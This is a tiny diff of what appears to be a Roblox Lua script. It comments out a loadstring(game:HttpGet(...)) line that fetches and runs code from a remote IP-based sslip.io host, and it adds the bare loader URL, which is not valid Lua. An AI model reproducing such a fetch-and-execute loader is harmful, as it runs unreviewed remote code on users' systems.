@@ -1,1 +1,2 @@
-loadstring(game:HttpGet('https://w7kwwhitelis5000.15.235.142.130.sslip.io/Lua/Loader'))()
+--loadstring(game:HttpGet('https://w7kwwhitelis5000.15.235.142.130.sslip.io/Lua/Loader'))()
+https://w7kwwhitelis5000.15.235.142.130.sslip.io/Lua/Loader
